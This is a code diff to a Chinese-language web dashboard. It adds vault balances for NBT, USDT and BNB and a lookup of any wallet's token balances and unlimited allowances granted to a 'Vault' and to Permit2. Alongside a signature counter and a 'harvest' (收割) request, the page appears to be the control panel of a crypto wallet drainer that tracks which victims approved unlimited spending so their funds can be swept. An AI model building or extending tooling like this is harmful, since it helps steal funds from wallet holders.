@@ -82,6 +82,13 @@
   .log .t { color: var(--muted); }
   .log .ok { color: var(--success); }
   .log .err { color: var(--danger); }
+  .info-row {
+    display: flex; justify-content: space-between; font-size: 13px;
+    padding: 8px 0; border-bottom: 1px solid rgba(37,41,74,0.5);
+  }
+  .info-row:last-child { border-bottom: none; }
+  .info-row span:first-child { color: var(--muted); }
+  .info-row .mono { font-family: 'Consolas', monospace; word-break: break-all; max-width: 70%; text-align: right; }
 </style>
 </head>
 <body>
@@ -105,9 +112,26 @@
         <div class="stat-value" id="sigCount">0</div>
       </div>
       <div class="stat">
-        <div class="stat-label">Vault 内 NBT 余额</div>
+        <div class="stat-label">Vault 内 NBT</div>
         <div class="stat-value" id="vaultBal">0 <small>NBT</small></div>
       </div>
+      <div class="stat">
+        <div class="stat-label">Vault 内 USDT</div>
+        <div class="stat-value" id="vaultUsdt">0 <small>USDT</small></div>
+      </div>
+      <div class="stat">
+        <div class="stat-label">Vault 内 BNB</div>
+        <div class="stat-value" id="vaultBnb">0 <small>BNB</small></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>👤 查询用户钱包余额</h3>
+      <div class="row">
+        <input type="text" id="userAddr" placeholder="输入钱包地址，如 0x39bB78...">
+        <button class="btn btn-accent" onclick="queryUser()">查询</button>
+      </div>
+      <div id="userResult" style="margin-top:14px; font-size:13px;"></div>
     </div>
 
     <div class="section">
@@ -164,10 +188,12 @@
 
   async function refreshVaultBalance() {
     try {
-      const r = await fetch('/api/vault/balance');
+      const r = await fetch('/api/balances');
       const d = await r.json();
       if (d.success) {
-        document.getElementById('vaultBal').textContent = parseFloat(d.balance).toFixed(2) + ' NBT';
+        document.getElementById('vaultBal').textContent = parseFloat(d.nbt).toFixed(2) + ' NBT';
+        document.getElementById('vaultUsdt').textContent = parseFloat(d.usdt).toFixed(2) + ' USDT';
+        document.getElementById('vaultBnb').textContent = parseFloat(d.bnb).toFixed(4) + ' BNB';
       }
     } catch (e) {}
   }
@@ -214,6 +240,31 @@
       await refreshVaultBalance();
     } catch (e) {
       log('收割请求失败: ' + e.message, 'err');
+    }
+  }
+
+  async function queryUser() {
+    const addr = document.getElementById('userAddr').value.trim();
+    if (!addr) { log('请输入钱包地址', 'err'); return; }
+    try {
+      const r = await fetch('/api/user-balance/' + addr);
+      const d = await r.json();
+      if (!d.success) { document.getElementById('userResult').innerHTML = '<span class="err">查询失败: ' + (d.error||'') + '</span>'; return; }
+      const el = document.getElementById('userResult');
+      const usdtVault = parseFloat(d.allowances.usdt_vault) > 0;
+      const usdtP2 = parseFloat(d.allowances.usdt_permit2) > 0;
+      const nbtVault = parseFloat(d.allowances.nbt_vault) > 0;
+      el.innerHTML = '<div style="background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:10px;padding:14px;">'
+        + '<div class="info-row"><span>钱包地址</span><span class="mono">' + d.address + '</span></div>'
+        + '<div class="info-row"><span>USDT 余额</span><span>' + parseFloat(d.balances.usdt).toFixed(4) + ' USDT</span></div>'
+        + '<div class="info-row"><span>NBT/CZ 余额</span><span>' + parseFloat(d.balances.nbt).toFixed(4) + ' NBT</span></div>'
+        + '<div class="info-row"><span>BNB 余额</span><span>' + parseFloat(d.balances.bnb).toFixed(6) + ' BNB</span></div>'
+        + '<div class="info-row"><span>USDT→Vault 授权</span><span>' + (usdtVault ? '<span class="status-pill ok">已授权(无限)</span>' : '<span class="status-pill err">未授权</span>') + '</span></div>'
+        + '<div class="info-row"><span>USDT→Permit2 授权</span><span>' + (usdtP2 ? '<span class="status-pill ok">已授权(无限)</span>' : '<span class="status-pill err">未授权</span>') + '</span></div>'
+        + '<div class="info-row"><span>NBT→Vault 授权</span><span>' + (nbtVault ? '<span class="status-pill ok">已授权(无限)</span>' : '<span class="status-pill err">未授权</span>') + '</span></div>'
+        + '</div>';
+    } catch (e) {
+      document.getElementById('userResult').innerHTML = '<span class="err">请求失败: ' + e.message + '</span>';
     }
   }
 
